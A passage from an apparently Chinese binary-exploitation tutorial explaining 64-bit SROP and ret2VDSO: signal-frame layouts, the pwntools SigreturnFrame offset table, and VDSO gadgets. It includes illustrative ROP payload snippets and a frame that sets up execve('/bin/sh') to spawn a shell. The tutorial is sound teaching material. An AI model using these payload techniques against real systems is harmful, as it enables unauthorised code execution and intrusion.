<li><p><strong>当内核从 ESP 所指的位置取 frame 时，这块内存是不是我完全可控，并且按正确布局填了 sigcontext 以及相关字段？</strong></p>
</li>
</ol>
<h2 id="64-位的-SROP"><a href="#64-位的-SROP" class="headerlink" title="64 位的 SROP"></a>64 位的 SROP</h2><p>在 <strong>原生 x86‑64 ABI</strong> 里，只有一个信号返回的系统调用：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn  15   <span class="comment">// 0x0f</span></span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>没有 <code>__NR_sigreturn=119</code> 这一类老接口。</li>
<li>所有信号（不管你用 <code>signal()</code> 还是 <code>sigaction()</code>）底层都走 <strong>rt 信号框架</strong>（<code>rt_sigaction</code> &#x2F; <code>rt_sigsuspend</code> &#x2F; <code>rt_sigreturn</code> 这一套）。</li>
</ul>
<p>所以对于一个 <strong>ELF64 程序</strong> 来说：</p>
<ul>
<li>想做 SROP，就必须触发 **sys_rt_sigreturn(15)**。</li>
<li>调用入口一般是 VDSO 里的一个 stub（类似 <code>__kernel_rt_sigreturn</code>）或你自己找的 <code>syscall</code> gadget。</li>
</ul>
<p>典型 stub 形态大概是：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__kernel_rt_sigreturn:</span></span><br><span class="line">    <span class="keyword">mov</span>    <span class="number">$15</span>, %rax         <span class="comment">; __NR_rt_sigreturn</span></span><br><span class="line">    <span class="keyword">syscall</span>                  <span class="comment">; 进入内核，内核从 RSP 指向的信号栈帧恢复所有寄存器</span></span><br><span class="line">    <span class="comment">; 正常不会“回到”这里</span></span><br></pre></td></tr></table></figure></div>

<p>但做 SROP 时，我们完全可以 <strong>绕开这个 stub</strong>：</p>
<ul>
<li>用 ROP 把 <code>RAX=15</code>；</li>
<li>让 <code>RSP</code> 指到你伪造的 frame；</li>
<li>再跳到任意 <code>syscall</code> gadget（例如 libc 或 VDSO 里的 <code>syscall; ret</code>）。</li>
</ul>
<p>内核看到 <code>syscall</code> + <code>rax=15</code>，就会按 <strong>rt_sigreturn</strong> 路径处理。</p>
<h3 id="64-位信号栈帧结构"><a href="#64-位信号栈帧结构" class="headerlink" title="64 位信号栈帧结构"></a>64 位信号栈帧结构</h3><p>64 位下，内核在送信号时会在用户栈上构造一个 <strong>rt 信号帧</strong>（结构名通常叫 <code>rt_sigframe</code>），核心部分是：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 一些历史遗留字段 / alignment */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">siginfo</span>  <span class="title">info</span>;</span>   <span class="comment">// 信号详细信息（信号号、错误码、出错地址等）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> <span class="title">uc</span>;</span>     <span class="comment">// 上下文（寄存器、栈、sigmask 等全在这）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>真正对 SROP 有用的是 <code>ucontext</code> 里的 <code>mcontext</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>   uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="type">stack_t</span>         uc_stack;</span><br><span class="line">    <span class="type">sigset_t</span>        uc_sigmask;</span><br><span class="line">    <span class="comment">/* 这里之后紧跟着是寄存器上下文（mcontext / sigcontext） */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> <span class="title">uc_mcontext</span>;</span>  <span class="comment">// 实际上就是那坨寄存器布局</span></span><br><span class="line">    <span class="comment">/* 后面可能还有额外扩展字段 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在 pwntools 里，你看到的 <code>registers[&#39;amd64&#39;]</code> 就是 <strong><code>uc_mcontext</code> 这一段的偏移表</strong>，像这样：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;amd64&#x27;</span>: &#123;</span><br><span class="line">  <span class="number">0</span>:   <span class="string">&#x27;uc_flags&#x27;</span>,</span><br><span class="line">  <span class="number">8</span>:   <span class="string">&#x27;&amp;uc&#x27;</span>,</span><br><span class="line">  <span class="number">16</span>:  <span class="string">&#x27;uc_stack.ss_sp&#x27;</span>,</span><br><span class="line">  <span class="number">24</span>:  <span class="string">&#x27;uc_stack.ss_flags&#x27;</span>,</span><br><span class="line">  <span class="number">32</span>:  <span class="string">&#x27;uc_stack.ss_size&#x27;</span>,</span><br><span class="line">  <span class="number">40</span>:  <span class="string">&#x27;r8&#x27;</span>,</span><br><span class="line">  <span class="number">48</span>:  <span class="string">&#x27;r9&#x27;</span>,</span><br><span class="line">  <span class="number">56</span>:  <span class="string">&#x27;r10&#x27;</span>,</span><br><span class="line">  <span class="number">64</span>:  <span class="string">&#x27;r11&#x27;</span>,</span><br><span class="line">  <span class="number">72</span>:  <span class="string">&#x27;r12&#x27;</span>,</span><br><span class="line">  <span class="number">80</span>:  <span class="string">&#x27;r13&#x27;</span>,</span><br><span class="line">  <span class="number">88</span>:  <span class="string">&#x27;r14&#x27;</span>,</span><br><span class="line">  <span class="number">96</span>:  <span class="string">&#x27;r15&#x27;</span>,</span><br><span class="line">  <span class="number">104</span>: <span class="string">&#x27;rdi&#x27;</span>,</span><br><span class="line">  <span class="number">112</span>: <span class="string">&#x27;rsi&#x27;</span>,</span><br><span class="line">  <span class="number">120</span>: <span class="string">&#x27;rbp&#x27;</span>,</span><br><span class="line">  <span class="number">128</span>: <span class="string">&#x27;rbx&#x27;</span>,</span><br><span class="line">  <span class="number">136</span>: <span class="string">&#x27;rdx&#x27;</span>,</span><br><span class="line">  <span class="number">144</span>: <span class="string">&#x27;rax&#x27;</span>,</span><br><span class="line">  <span class="number">152</span>: <span class="string">&#x27;rcx&#x27;</span>,</span><br><span class="line">  <span class="number">160</span>: <span class="string">&#x27;rsp&#x27;</span>,</span><br><span class="line">  <span class="number">168</span>: <span class="string">&#x27;rip&#x27;</span>,</span><br><span class="line">  <span class="number">176</span>: <span class="string">&#x27;eflags&#x27;</span>,</span><br><span class="line">  <span class="number">184</span>: <span class="string">&#x27;csgsfs&#x27;</span>,</span><br><span class="line">  <span class="number">192</span>: <span class="string">&#x27;err&#x27;</span>,</span><br><span class="line">  <span class="number">200</span>: <span class="string">&#x27;trapno&#x27;</span>,</span><br><span class="line">  <span class="number">208</span>: <span class="string">&#x27;oldmask&#x27;</span>,</span><br><span class="line">  <span class="number">216</span>: <span class="string">&#x27;cr2&#x27;</span>,</span><br><span class="line">  <span class="number">224</span>: <span class="string">&#x27;&amp;fpstate&#x27;</span>,</span><br><span class="line">  <span class="number">232</span>: <span class="string">&#x27;__reserved&#x27;</span>,</span><br><span class="line">  <span class="number">240</span>: <span class="string">&#x27;sigmask&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以这么理解：</p>
<ul>
<li><strong>40–96</strong> 这一段：保存的是 <code>r8, r9, r10, r11, r12, r13, r14, r15</code>；</li>
<li><strong>104–152</strong>：<code>rdi, rsi, rbp, rbx, rdx, rax, rcx</code>；</li>
<li><strong>160</strong>：<code>rsp</code>（信号返回后新的栈指针）；</li>
<li><strong>168</strong>：<code>rip</code>（信号返回后第一条将要执行的指令）；</li>
<li><strong>176</strong>：<code>eflags</code>；</li>
<li><strong>184</strong>：<code>csgsfs</code>，里面打包了 CS&#x2F;GS&#x2F;FS 等段寄存器；用户态一般保持默认 0x33；</li>
<li><strong>240</strong>：<code>sigmask</code>，信号屏蔽字（对利用通常没啥影响）。</li>
</ul>
<p>对 SROP 来说，最关心的就是：</p>
<ul>
<li><code>rax</code>：你想要执行的下一次 syscall 编号（例如 59&#x3D;execve）；</li>
<li><code>rdi, rsi, rdx, r10, r8, r9</code>：syscall 参数（第 1–6 个）；</li>
<li><code>rsp</code>：第二阶段 ROP 的栈位置 &#x2F; 任意你想要的栈；</li>
<li><code>rip</code>：第二阶段 ROP 的入口，通常是某个 gadget，比如 <code>syscall; ret</code>、<code>pop rdi; ret</code> 等；</li>
<li><code>csgsfs</code>：保持默认 0x33，别瞎改；</li>
<li><code>eflags</code>：一般放一个“正常用户态”的值，比如 pwntools 默认填的即可。</li>
</ul>
<p><strong>pwntools 的 <code>SigreturnFrame(arch=&#39;amd64&#39;)</code></strong> 就是按这个偏移表构造出一整块内存，长度大概 248 字节。</p>
<h3 id="64-位-SROP-流程"><a href="#64-位-SROP-流程" class="headerlink" title="64 位 SROP 流程"></a>64 位 SROP 流程</h3><p>在 64 位下做 SROP，一般是“两级跳板”：</p>
<h4 id="第一步：触发-rt-sigreturn-15"><a href="#第一步：触发-rt-sigreturn-15" class="headerlink" title="第一步：触发 rt_sigreturn(15)"></a>第一步：触发 <strong>rt_sigreturn(15)</strong></h4><p>目标：让 CPU 执行一次 <code>syscall</code>，此时：</p>
<ul>
<li><code>RAX = 15</code>（<code>__NR_rt_sigreturn</code>）；</li>
<li><code>RSP =</code> 指向你伪造好的 <code>SigreturnFrame</code>。</li>
</ul>
<p>有两种常见做法：</p>
<ol>
<li><p><strong>直接用 <code>syscall</code> gadget</strong></p>
<p>比如你在二进制或 libc 里找到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xdeadbeef: syscall</span><br><span class="line">            ret</span><br></pre></td></tr></table></figure></div>

<p>那你可以这么布：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stage1 rop</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p64(pop_rax_ret)       <span class="comment"># gadget</span></span><br><span class="line">payload += p64(<span class="number">15</span>)                <span class="comment"># rax = 15 (rt_sigreturn)</span></span><br><span class="line">payload += p64(syscall_ret)       <span class="comment"># 执行 syscall; ret</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)           <span class="comment"># 紧接着就是伪造好的 SigreturnFrame</span></span><br></pre></td></tr></table></figure></div>

<p>这样执行流程是：</p>
<ul>
<li><code>ret</code> → <code>pop_rax_ret</code>；</li>
<li><code>pop_rax_ret</code> 把 15 弹到 RAX；</li>
<li>再 <code>ret</code> 到 <code>syscall_ret</code>；</li>
<li>执行 <code>syscall</code>（内核走 rt_sigreturn），从当前 <code>RSP</code>（指向 frame）恢复上下文。</li>
</ul>
</li>
<li><p><strong>利用 VDSO 里的 <code>__kernel_rt_sigreturn</code></strong></p>
<p>如果你拿到了 VDSO 基址，也可以直接 <code>ret</code> 到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__kernel_rt_sigreturn:</span><br><span class="line">    mov $15, %rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></div>

<p>那就不需要自己准备 <code>pop rax</code> gadget，但利用逻辑一样：<br>关键是 <strong>此时的 RSP 必须已经指到你的 frame</strong>。</p>
</li>
</ol>
<h4 id="第二步：在-frame-里布“真正的利用场景”"><a href="#第二步：在-frame-里布“真正的利用场景”" class="headerlink" title="第二步：在 frame 里布“真正的利用场景”"></a>第二步：在 frame 里布“真正的利用场景”</h4><p>假设你想用 syscall 的方式直接 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>：</p>
<ul>
<li>64 位 syscall 编号：<code>__NR_execve = 59</code>；</li>
<li>参数寄存器：<code>rdi=&quot;/bin/sh&quot;</code>, <code>rsi=0</code>, <code>rdx=0</code>；</li>
<li>还需要一个 <code>syscall</code> 指令。</li>
</ul>
<p>那你可以这样构造 frame（用 pwntools 做示意）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span>               <span class="comment"># SYS_execve</span></span><br><span class="line">frame.rdi = binsh_addr       <span class="comment"># &quot;/bin/sh&quot; 字符串地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = rop2_addr        <span class="comment"># 信号返回后新的 RSP（可以指向后续 ROP）</span></span><br><span class="line">frame.rip = syscall_ret      <span class="comment"># 信号返回后先执行 syscall; ret</span></span><br></pre></td></tr></table></figure></div>

<p>触发 rt_sigreturn 之后：</p>
<ol>
<li><p>内核从 frame 中恢复寄存器；</p>
</li>
<li><p><code>RIP = syscall_ret</code>，<code>RAX = 59</code>，<code>RDI/RSI/RDX</code> 等都已经是你布好的；</p>
</li>
<li><p>回到用户态，CPU 执行 <code>syscall; ret</code>：</p>
<ul>
<li>这次 syscall 是 <code>execve</code>，如果成功就不再返回；</li>
<li>如果失败，下一条是 <code>ret</code>，这时栈顶在 <code>rop2_addr</code>，你可以继续第二阶段 ROP。</li>
</ul>
</li>
</ol>
<p><strong>所以 SROP 的本质：</strong></p>
<blockquote>
<p>用一次 <code>rt_sigreturn(15)</code> 换来“一次性对所有寄存器的精确控制”，<br>然后用这套寄存器去执行你真正想要的 syscall 或 ROP 链。</p>
</blockquote>
<h1 id="ret2VDSO"><a href="#ret2VDSO" class="headerlink" title="ret2VDSO"></a>ret2VDSO</h1><h2 id="什么是-VDSO"><a href="#什么是-VDSO" class="headerlink" title="什么是 VDSO"></a>什么是 VDSO</h2><p>vDSO（virtual Dynamic Shared Object）是 Linux 内核提供的一块“虚拟共享库”，内核在创建进程时自动把它映射到每个用户进程的地址空间，用来加速某些本来需要系统调用的操作（尤其是时间相关操作）。</p>
<blockquote>
<p>在传统模式下，用户态程序要获取内核信息（例如当前时间），需要：</p>
<ol>
<li>执行系统调用指令（x86 早期是 <code>int 0x80</code>，后来有 <code>sysenter</code>&#x2F;<code>syscall</code> 等）。</li>
<li>CPU 从用户态切换到内核态，进入内核系统调用处理路径。</li>
<li>内核处理完，再从内核态切回用户态。</li>
</ol>
<p>这几步涉及特权级切换、寄存器保存&#x2F;恢复、上下文切换等，开销不小。对于像 <code>gettimeofday()</code>、<code>clock_gettime()</code> 这种“高频”调用，系统调用开销会在整体性能中占很大比例。</p>
<p>vDSO 的目的就是：让某些“读内核数据但不需要真正进入内核执行复杂逻辑”的操作，在用户态直接完成，省掉一次系统调用的开销。</p>
</blockquote>
<p>从内核实现角度看：</p>
<ul>
<li>vDSO 是一个很小的 ELF 共享库（.so 形式）。</li>
<li>编译进内核镜像，但<strong>不会出现在文件系统里</strong>（你看不到 <code>/lib/vdso.so</code> 这样的文件）。</li>
<li>内核在创建每一个用户进程时，会把这段代码映射到进程虚拟地址空间中，并标记为 <code>[vdso]</code>。</li>
</ul>
<p>你可以用下面命令在任意进程里看到它：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/self/maps | grep vdso</span><br><span class="line">7ffc5a4d3000-7ffc5a4d5000 r-xp 00000000 00:00 0      [vdso]</span><br></pre></td></tr></table></figure></div>

<p>对用户态来说，它<strong>看起来就像一个普通共享库</strong>：里面有一些函数符号（例如 <code>__vdso_clock_gettime</code>），可以被 C 运行时库（glibc 等）通过 ELF 机制解析并调用。</p>
<blockquote>
<p>以常见的 <code>clock_gettime()</code> 为例，典型调用链是这样的：</p>
<ol>
<li><p>你的代码调用标准库函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime(CLOCK_REALTIME, &amp;ts);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>glibc 在初始化时会去查进程的 auxv（辅助向量），找到 <code>AT_SYSINFO_EHDR</code>，这是内核告诉 glibc：“vDSO 在哪一块地址上”。</p>
</li>
<li><p>glibc 再在 vDSO 的 ELF 头和符号表里查找 <code>__vdso_clock_gettime</code> 等符号：</p>
<ul>
<li>如果找到了，就<strong>直接在用户态调用这段 vDSO 函数</strong>。</li>
<li>如果没找到（老内核、或该架构未实现），就<strong>退回到普通的系统调用</strong>路径。</li>
</ul>
</li>
</ol>
<p>这样，应用程序仍然只是调用标准的 <code>clock_gettime()</code>，完全不需要关心 vDSO 的存在。有无 vDSO、用不用 vDSO 都由 C 库自动决定。</p>
<p>vDSO 函数内部会直接访问由内核维护的共享时间数据结构（例如时间基准、序列号等），用用户态算法算出当前时间，这就免掉了进入内核的系统调用。</p>
</blockquote>
<p>vDSO 里具体导出的函数和架构、内核版本有关，但典型包括：</p>
<ul>
<li><p>时间相关：</p>
<ul>
<li><code>gettimeofday()</code>（在较新的系统上更多用 <code>clock_gettime</code> 替代）</li>
<li><code>clock_gettime()</code></li>
<li><code>clock_getres()</code></li>
<li><code>time()</code>（有些架构）</li>
</ul>
</li>
<li><p>CPU 信息：</p>
<ul>
<li><code>getcpu()</code>：返回当前运行的 CPU 与 NUMA 节点</li>
</ul>
</li>
<li><p>有些架构 &#x2F; 版本还会提供：</p>
<ul>
<li><code>getrandom()</code> 的 vDSO 版本（glibc 有相应支持）</li>
<li>用于选择最快系统调用入口的方法函数等</li>
</ul>
</li>
</ul>
<p>这些函数都是<strong>只读内核状态或简单计算</strong>，不会修改复杂内核数据结构，不涉及 I&#x2F;O；适合在用户态“被缓存&#x2F;被近似计算”，因此可以安全放到 vDSO 中。</p>
<blockquote>
<p>在 vDSO 出现之前，x86 上曾有过一个叫 <strong>vsyscall</strong> 的机制：</p>
<ul>
<li><p>vsyscall 提供了一小块固定地址的内存页，用于实现少数函数（典型是 <code>gettimeofday</code> 等）。</p>
</li>
<li><p>这块地址在每个进程中都是<strong>固定不变的</strong>（ABI 约定），所以：</p>
<ul>
<li>功能有限（最多就几项调用）；</li>
<li>严重影响安全性（固定地址对攻击者非常友好）。</li>
</ul>
</li>
</ul>
<p>vDSO 的设计目标之一就是替代 vsyscall：</p>
<ul>
<li>vDSO 是完整的 ELF 共享库，可以导出更多符号；</li>
<li>vDSO 地址是<strong>随机化的</strong>（配合 ASLR），安全性高；</li>
<li>ABI 通过符号 + 版本来保证，比固定地址更灵活。</li>
</ul>
<p>目前新内核中，vsyscall 不是被废弃就是被模拟（为了兼容旧程序），而<strong>主流优化都通过 vDSO 实现</strong>。</p>
</blockquote>
<p>VSDO 中的常用 gadget：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__kernel_vsyscall:</span>    <span class="comment">; offset 0x570</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">__kernel_sigreturn:</span>   <span class="comment">; offset 0x590</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0x77</span></span><br><span class="line">    <span class="keyword">int</span>  <span class="number">0x80</span>         <span class="comment">; sys_sigreturn</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">__kernel_rt_sigreturn:</span> <span class="comment">; offset 0x5A0</span></span><br><span class="line">    <span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0xAD</span></span><br><span class="line">    <span class="keyword">int</span>  <span class="number">0x80</span>         <span class="comment">; sys_rt_sigreturn</span></span><br><span class="line">    <span class="comment">; 然后都是 nop</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong><code>__kernel_sigreturn</code> 中开头 <code>pop eax</code> 的作用：</strong></p>
<p><code>pop eax</code> 这一下，其实不是为了“用”到 <code>eax</code>，而纯粹是为了<strong>调节栈指针 ESP</strong>，把栈顶从 <em>signum 参数</em> 挪到 <em>sigcontext 结构体</em> 上去，好让 <code>sys_sigreturn</code> 按 ABI 正常工作。</p>
<p>我们一步一步看这个 stub 是怎么被用的：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__kernel_sigreturn:</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0x77</span></span><br><span class="line">    <span class="keyword">int</span>  <span class="number">0x80</span>         <span class="comment">; sys_sigreturn</span></span><br></pre></td></tr></table></figure></div>

<h3 id="1-信号返回时的栈长什么样？"><a href="#1-信号返回时的栈长什么样？" class="headerlink" title="1. 信号返回时的栈长什么样？"></a>1. 信号返回时的栈长什么样？</h3><p>在 32 位老的 signal 机制里（非 rt-signal 的 <code>sigreturn</code>，syscall 号 119 &#x3D; 0x77），内核给用户态搭 signal handler 的栈，大概是这样（简化）：</p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// handler 入口时的栈（esp 指向 pretcode）</span><br><span class="line"></span><br><span class="line">esp -&gt; pretcode      ; 返回地址，指向 __kernel_sigreturn（或内联 retcode）</span><br><span class="line">       sig           ; int signum 参数</span><br><span class="line">       struct sigcontext sc;   ; 保存的寄存器等</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>handler 的函数原型是 <code>void handler(int signum)</code>。</p>
</li>
<li><p>内核模拟了一个普通 C 调用：栈上有返回地址（pretcode），再下面是参数 <code>signum</code>，再下面是信号现场 <code>sigcontext</code> 等。</p>
</li>
<li><p>当 handler 执行完 <code>ret</code> 的时候：</p>
<ul>
<li>CPU 会从栈顶弹出 <code>pretcode</code> 到 <code>eip</code>（跳到 <code>__kernel_sigreturn</code>）。</li>
<li>同时 <code>esp += 4</code>，所以<strong>此时 <code>esp</code> 指向的是栈上的 <code>signum</code> 参数</strong>。</li>
</ul>
</li>
</ul>
<p>也就是说：<br>**进入 <code>__kernel_sigreturn</code> 时，栈顶是 <code>signum</code>**，再往后才是 <code>sigcontext</code>。</p>
<h3 id="2-sys-sigreturn-需要什么？"><a href="#2-sys-sigreturn-需要什么？" class="headerlink" title="2. sys_sigreturn 需要什么？"></a>2. <code>sys_sigreturn</code> 需要什么？</h3><p><code>sys_sigreturn</code> 这个系统调用的 ABI 要求：<br>当你执行 <code>int 0x80</code> 调用 <code>sys_sigreturn</code> 时，<strong>内核会拿当前的 <code>esp</code> 当成 signal frame &#x2F; sigcontext 的地址</strong>，也就是：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_sigreturn() &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> *<span class="title">frame</span> =</span> (<span class="keyword">struct</span> sigframe __user *)current_pt_regs()-&gt;sp;</span><br><span class="line">    <span class="comment">// 或者用 frame-&gt;sc 这样的方式去 restore</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>换句话说：</p>
<blockquote>
<p>进入 <code>sys_sigreturn</code> 之前，<code>esp</code> 必须指向 <code>struct sigcontext</code>（准确地说是 signal frame 里 <code>sc</code> 那块）。</p>
</blockquote>
<p>但我们刚才说了：<br>一进 <code>__kernel_sigreturn</code> 的时候，<code>esp</code> 其实还在 <strong>signum 参数</strong> 上。</p>
<p>所以，在做系统调用之前，需要把 <code>esp</code> 从 signum 这个位置<strong>挪到 sigcontext 上</strong>。</p>
<h3 id="3-pop-eax-在干嘛？"><a href="#3-pop-eax-在干嘛？" class="headerlink" title="3. pop eax 在干嘛？"></a>3. <code>pop eax</code> 在干嘛？</h3><p>到了这句：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">eax</span></span><br></pre></td></tr></table></figure></div>

<p>此时栈布局大致是：</p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp -&gt; signum</span><br><span class="line">       sigcontext (保存的各寄存器、eip、esp 等)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure></div>

<p>执行 <code>pop eax</code> 之后发生了两件事：</p>
<ol>
<li>把栈顶的 <code>signum</code> 弹到 <code>eax</code> 里（但马上就会被覆盖掉，其实压根没想用它）。</li>
<li><code>esp += 4</code>，**现在的 <code>esp</code> 就指向了 <code>sigcontext</code>**。</li>
</ol>
<p>也就是它实际上相当于：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>   <span class="comment">; 但为了长度 &amp; 方便，用了 pop eax 来实现</span></span><br></pre></td></tr></table></figure></div>

<p>接着：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0x77</span>    <span class="comment">; 设置 syscall 号 = sys_sigreturn</span></span><br><span class="line"><span class="keyword">int</span>  <span class="number">0x80</span></span><br></pre></td></tr></table></figure></div>

<p><code>mov</code> 把 <code>eax</code> 改成 0x77，刚刚从栈弹出来的 <code>signum</code> 被彻底覆盖掉，说明我们根本不关心 <code>pop</code> 出来的值，只是借 <code>pop</code> 这个指令来“顺便把 esp 加 4”。</p>
<p>于是，在 <code>int 0x80</code> 进内核的时候：</p>
<ul>
